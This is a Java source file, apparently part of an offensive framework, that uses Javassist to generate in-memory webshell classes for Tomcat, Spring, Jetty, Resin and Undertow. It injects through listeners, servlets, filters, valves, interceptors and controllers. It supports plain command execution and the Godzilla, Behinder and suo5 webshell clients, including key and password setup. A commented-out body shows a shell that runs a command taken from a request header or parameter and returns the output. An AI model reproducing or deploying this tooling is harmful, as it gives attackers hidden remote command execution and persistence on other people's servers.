package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.annotation.Builder;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.Middleware;
import com.ppp.utils.maker.CryptoUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

/**
 * @author Whoopsunix
 */
@Builder(Builder.MS)
public class MSJavaClassBuilder {
    /**
     * Tomcat
     */
    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        tomcatListenerResponseMaker(ctClass);

        // run
//        CtMethod runCtMethod = ctClass.getDeclaredMethod("run");
//        runCtMethod.setBody("{try {\n" +
//                "    Object httpServletRequest = invokeMethod($1, \"getServletRequest\", new Class[]{}, new Object[]{});\n" +
//                "    Object header =  invokeMethod(httpServletRequest, \"getHeader\", new Class[]{String.class}, new Object[]{HEADER});\n" +
//                "    Object param = invokeMethod(httpServletRequest, \"getParameter\", new Class[]{String.class}, new Object[]{PARAM});\n" +
//                "    String str = null;\n" +
//                "    if (header != null) {\n" +
//                "        str = (String) header;\n" +
//                "    } else if (param != null) {\n" +
//                "        str = (String) param;\n" +
//                "    }\n" +
//                "    String result = exec(str);\n" +
//                "    Object response = getResponse(httpServletRequest);\n" +
//                "    invokeMethod(response, \"setStatus\", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});\n" +
//                "    Object writer = invokeMethod(response, \"getWriter\", new Class[]{}, new Object[]{});\n" +
//                "    invokeMethod(writer, \"println\", new Class[]{String.class}, new Object[]{result});\n" +
//                "} catch (Exception ignored) {\n" +
////                "    ignored.printStackTrace();\n" +
//                "}}");

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] tomcatListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        tomcatListenerResponseMaker(ctClass);

        godzillaMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] tomcatListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        tomcatListenerResponseMaker(ctClass);

        behinderMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] tomcatListenerSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        tomcatListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    public void tomcatListenerResponseMaker(CtClass ctClass) throws Exception {
        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{        try {\n" +
                "            $1 = getFieldValue($1, \"request\");\n" +
                "        }catch (Exception e){\n" +
                "        }\n" +
                "        Object httpServletResponse = getFieldValue($1, \"response\");\n" +
                "        return httpServletResponse;}");
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] tomcatServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] tomcatServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] tomcatServletSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] tomcatFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] tomcatFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] tomcatFilterSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Executor)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatExecutorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Valve)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] tomcatValveExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Valve)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] tomcatValveGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Valve)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] tomcatValveBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Valve)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] tomcatValveSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    /**
     * Spring
     */
    @Middleware(Middleware.Spring)
    @MemShell(MemShell.Controller)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] springControllerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Spring)
    @MemShell(MemShell.Interceptor)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] springInterceptorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Spring)
    @MemShell(MemShell.Interceptor)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] springInterceptorGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    /**
     * Jetty
     */
    @Middleware(Middleware.Jetty)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] jettyListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        jettyListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    // TODO 7.0.0 不支持报错 Incompatible magic value 529205248 in class file <Unknown>
    @Middleware(Middleware.Jetty)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] jettyListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        jettyListenerResponseMaker(ctClass);

        godzillaMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Jetty)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] jettyListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        jettyListenerResponseMaker(ctClass);

        behinderMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Jetty)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] jettyListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        jettyListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    public void jettyListenerResponseMaker(CtClass ctClass) throws Exception {
        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
//        responseCtMethod.setBody("{Object channel = getFieldValue($1, \"_channel\");\n" +
//                "return getFieldValue(channel, \"_response\");}");
        responseCtMethod.setBody("{return invokeMethod($1, \"getResponse\", new Class[]{}, new Object[]{});}");
    }

    /**
     * Resin
     */
    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] resinListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        resinListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] resinListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        resinListenerResponseMaker(ctClass);

        godzillaMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] resinListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        resinListenerResponseMaker(ctClass);

        behinderMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] resinListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        resinListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    public void resinListenerResponseMaker(CtClass ctClass) throws Exception {
        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{\n" +
                "return getFieldValue($1, \"_response\");}");
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] resinServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] resinServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] resinServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] resinServletSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] resinFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] resinFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] resinFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Resin)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] resinFilterSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    /**
     * Resin
     */
    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] undertowServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] undertowServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] undertowServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Servlet)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] undertowServletSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] undertowListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        undertowListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] undertowListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        undertowListenerResponseMaker(ctClass);

        godzillaMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] undertowListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        undertowListenerResponseMaker(ctClass);

        behinderMS(javaClassHelper);
        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Listener)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] undertowListenerSuo5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        // response
        undertowListenerResponseMaker(ctClass);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    public void undertowListenerResponseMaker(CtClass ctClass) throws Exception {
        // response
        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
        responseCtMethod.setBody("{" +
                "    Object exchange = getFieldValue($1, \"exchange\");\n" +
                "    Map attachments = (Map) getFieldValue(exchange, \"attachments\");\n" +
                "    Object[] tables = (Object[]) getFieldValue(attachments, \"table\");\n" +
                "    for (int i = 0; i < tables.length; i++) {\n" +
                "        try {\n" +
                "            Object table = tables[i];\n" +
                "            if (table == null)\n" +
                "                continue;\n" +
                "            if (table.getClass().getName().equals(\"io.undertow.servlet.handlers.ServletRequestContext\")) {\n" +
                "                return getFieldValue(table, \"originalResponse\");\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "        }\n" +
                "    }\n" +
                "    return null;" +
                "}");
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Exec)
    public byte[] undertowFilterExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Godzilla)
    public byte[] undertowFilterGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        godzillaMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.Behinder)
    public byte[] undertowFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        behinderMS(javaClassHelper);
        return defaultOriginalMS(cls, javaClassHelper);
    }

    @Middleware(Middleware.Undertow)
    @MemShell(MemShell.Filter)
    @MemShellFunction(MemShellFunction.sou5)
    public byte[] undertowFilterSou5(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        return defaultOriginalMS(cls, javaClassHelper);
    }

    public static void godzillaMS(JavaClassHelper javaClassHelper) throws Exception {
        String pass = javaClassHelper.getPass();
        String key = javaClassHelper.getKey();

        Printer.yellowInfo(String.format("pass: %s", pass));
        Printer.yellowInfo(String.format("key: %s", key));
//        javaClassHelper.setPass("3c6e0b8a9c15224a");
        javaClassHelper.setKey(CryptoUtils.md5Half(key));
//        javaClassHelper.setPass(pass);
    }

    /**
     * 冰蝎 密码
     */
    public static void behinderMS(JavaClassHelper javaClassHelper) throws Exception {
        String pass = javaClassHelper.getPass();
        Printer.yellowInfo(String.format("pass: %s", pass));
//        javaClassHelper.setPass("e45e329feb5d925b");
        javaClassHelper.setPass(CryptoUtils.md5Half(pass));
    }

    /**
     * 默认
     *
     * @param cls
     * @param javaClassHelper
     * @return
     * @throws Exception
     */
    public static byte[] defaultOriginalMS(Class cls, JavaClassHelper javaClassHelper) throws Exception {
        CtClass ctClass = initCtClass(cls);

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);

        return JavaClassModifier.toBytes(ctClass);
    }

    public static CtClass initCtClass(Class cls) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
        classPool.importPackage("javax.servlet.http");
        classPool.importPackage("java.util");

        CtClass ctClass = classPool.getCtClass(cls.getName());
        return ctClass;
    }


}
